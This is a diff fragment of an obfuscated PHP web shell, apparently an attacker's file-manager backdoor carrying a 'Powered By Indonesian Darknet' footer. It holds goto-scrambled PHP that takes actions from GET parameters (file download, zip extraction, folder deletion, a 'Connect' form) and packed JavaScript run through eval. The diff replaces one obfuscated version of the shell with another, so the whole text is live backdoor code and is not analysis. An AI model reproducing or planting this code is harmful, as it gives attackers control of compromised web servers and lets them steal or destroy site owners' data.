+goto f3YaO_36Gp;
+cS5buQoIBP:
+goto ZBWF6RSxh7;
+goto nRad7u_84k;
+iau78ljYgH:
+if ($hzOvuJeFzz == "cdir") {
+goto iqfV5KrODo;
+}
+goto gsi4neWUGA;
+nNXfQ4ODK4:
+et0KZW4bvS:
+goto JkRKETx2SF;
+ygIr4ZdOgL:
+goto ZBWF6RSxh7;
+goto WNq6fySumu;
+pMoCy2S2fT:
+?>
 </div>
-      <div class="form-group">
-        <button type="submit" name="s" class="btn btn-outline-light rounded-0">Connect</button>
-      </div>
-      </form>
-    <?php  goto nUrvo842ue; fZMgVZhTUw: ?>"></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button></div></form>
-    <?php  goto cPKCcf7MR9; imEup2KTzo: echo scOD165rR2($_GET["n"]); goto L8TjZe_v0G; ns9M42YdZd: echo phpversion(); goto Ym92vxFdSr; bJHEdblZKU: F0xQFfn0VO: goto MVg1PkuxCs; ZhKBv1Iz3W: if (!isset($_GET["a"])) { goto fDUZVEdq_w; } goto Hxxc32aPGE; nUrvo842ue: if (!isset($_POST['s'])) { goto ZgCoZJOFL9; } goto hMS8V72NkH; DkoO5aHwEx: fqbjkF8tFG: goto stOOeE0nH7; maVTuLjvor: header("Content-disposition: attachment; filename=\"" . SCod165rR2($_GET["n"]) . "\""); goto xRWajGhsvU; MMQV_0sye0: ?>
-    </article>
-    <div class="bg-dark border text-center mt-2 py-2"><small>Copyright &copy; 2021 - Powered By Indonesian Darknet</small></div>
-  </main>
-  <script src="//code.jquery.com/jquery-3.5.1.slim.min.js"></script><script src="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.bundle.min.js" ></script><script src="//cdn.jsdelivr.net/npm/bs-custom-file-input/dist/bs-custom-file-input.min.js"></script><script>eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('E.n();$(\'[2-m="4"]\').4();$(".l").k(j(e){e.g();h 0=$(6).5("2-0");c({b:"a",9:"o i q?",w:"D "+0+" p C B",A:7,z:7,}).y((8)=>{r(8){x 1=$(6).5("3")+"&t="+((0=="v")?"d":"f");u.s.3=1}})});',41,41,'type|buildURL|data|href|tooltip|attr|this|true|willDelete|title|warning|icon|swal||||preventDefault|let|you|function|click|delete|toggle|init|Are|will|sure|if|location||document|folder|text|const|then|dangerMode|buttons|deleted|be|This|bsCustomFileInput'.split('|'),0,{}))</script>
+<div class="border bg-dark my-2 py-2 table-responsive">
+<div class="mx-2">
+<span>Path:</span>
+<?php
+goto A1iu02J4SH;
+dKtG97l82G:
+$hzOvuJeFzz = RxEFbN6HEY($_GET["a"]);
+goto t5hyi0WMXW;
+fV1xJLciE1:
+$j6fm9JkXX3->extractTo(basename($TQjF6JN0Xn[$IKiphkRa67], '.zip'));
+goto wlhV36GSCm;
+A1iu02J4SH:
+$WekN4aubDI = preg_split("/(\\\\|\\/)/", $EEfZ6TZDdb);
+goto mfVsx6oHSn;
+KvyyfhHz82:
+goto jJAOZDhhff;
+goto pQ3h2CEIaE;
+QFdg_eyOVo:
+bb5inVuGYh("file to delete the folder", rxEfBN6Hey($EEfZ6TZDdb, 0), 0);
+goto hlAdt5ocAO;
+kI2aFVtVVe:
+?>
+<h5>View <?php
+goto xezzXbZ0n3;
+PaYSwvYogS:
+echo "?l=" . RXEFbn6hey($EEfZ6TZDdb, 0) . "&a=" . rxEfbn6HEy("cdir", 0);
+goto iiqLupTD75;
+b2f2v54QKI:
+?>
+</article>
+<div class="bg-dark border text-center mt-2 py-2">
+<small>Copyright &copy; 2021 - Powered By Indonesian Darknet</small>
+</div>
+</main>
+<script src="//code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+<script src="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.bundle.min.js"></script>
+<script src="//cdn.jsdelivr.net/npm/bs-custom-file-input/dist/bs-custom-file-input.min.js"></script>
+<script>
+eval(function(p, a, c, k, e, d) {
+e = function(c) {
+return(c < a?'': e(parseInt(c/a)))+((c = c%a) > 35?String.fromCharCode(c+29): c.toString(36))}; if (!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('E.n();$(\'[2-m="4"]\').4();$(".l").k(j(e){e.g();h 0=$(6).5("2-0");c({b:"a",9:"o i q?",w:"D "+0+" p C B",A:7,z:7,}).y((8)=>{r(8){x 1=$(6).5("3")+"&t="+((0=="v")?"d":"f");u.s.3=1}})});',41,41,'type|buildURL|data|href|tooltip|attr|this|true|willDelete|title|warning|icon|swal||||preventDefault|let|you|function|click|delete|toggle|init|Are|will|sure|if|location||document|folder|text|const|then|dangerMode|buttons|deleted|be|This|bsCustomFileInput'.split('|'),0,{}))
+</script>
 </body>
 </html>
